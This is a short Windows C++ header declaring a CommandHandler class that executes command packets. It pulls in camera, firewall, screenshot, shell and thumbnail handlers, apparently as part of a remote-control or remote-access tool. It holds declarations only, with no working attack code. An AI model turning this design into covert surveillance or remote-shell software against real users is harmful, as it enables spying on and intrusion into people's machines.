#ifndef	__COMMAND_HANDLER_H__
#define __COMMAND_HANDLER_H__

#include <Windows.h>

#include "CommandProtocol.h"
#include "CameraHandler.h"
#include "FirewallHandler.h"
#include "ScreenshotHandler.h"
#include "ShellHandler.h"
#include "Thumbnails.h"

class CommandHandler
{
public:
	CommandHandler();
	~CommandHandler();

	CMDPacket Execute(CMDPacket cmd);

private:
	ScreenshotHandler scrshot;
	CameraHandler camera;
	Thumbnails thumbnail;

	LPCTSTR GenerateTempFilePath();
};

#endif